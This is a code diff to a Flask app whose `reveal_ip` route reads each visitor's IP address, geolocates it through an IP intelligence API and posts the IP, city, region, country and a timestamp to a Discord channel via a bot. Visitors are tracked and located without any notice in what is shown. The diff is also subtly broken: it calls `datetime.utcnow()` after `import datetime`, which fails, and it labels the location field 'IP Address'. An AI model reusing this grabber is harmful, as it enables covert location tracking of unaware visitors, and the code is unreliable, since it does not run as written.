@@ -2,6 +2,7 @@ from flask import Flask, request, jsonify, render_template
 import requests
 import os
 import json
+import datetime
 from dotenv import load_dotenv
 
 load_dotenv()
@@ -16,15 +17,25 @@ app = Flask(__name__)
 DISCORD_BOT_TOKEN = API_KEY
 DISCORD_CHANNEL_ID = DISCORD_CHANNEL_ID
 
-def send_ip_to_discord(ip):
+def send_ip_to_discord(ip, data):
     url = f"https://discord.com/api/v10/channels/{DISCORD_CHANNEL_ID}/messages"
     headers = {
         "Authorization": f"Bot {DISCORD_BOT_TOKEN}",
         "Content-Type": "application/json"
     }
-    json_data = {
-        "content": f"New visitor IP: `{ip}`"
+
+    embed = {
+        "title": "New Visitor",
+        "description": "IP Address: " + ip,
+        "color": 65280,  # green
+        "fields": [
+            {"name": "IP Address", "value": f"{data['location']['city']}, {data['location']['region']}, {data['location']['country']} {data['flag']['emoji']}", "inline": False},
+            {"name": "Timestamp", "value": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"), "inline": False}
+        ]
     }
+
+    json_data = {"embeds": [embed]}
+
     response = requests.post(url, headers=headers, json=json_data)
     
     if response.status_code != 200 and response.status_code != 204:
@@ -43,10 +54,10 @@ def reveal_ip():
     ip = forwarded.split(',')[0].strip()
 
     # Make a request to the Abstract API to get IP intelligence data and parse the response
-    #response = requests.get(f"https://ip-intelligence.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&ip_address=" + ip)
-    #data = json.loads(response.text)
+    response = requests.get(f"https://ip-intelligence.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&ip_address=" + ip)
+    data = json.loads(response.text)
 
-    send_ip_to_discord(ip)
+    send_ip_to_discord(ip, data)
 
     #return response.json()  # Return the JSON response directly from the Abstract API
     return jsonify({"ip": ip})
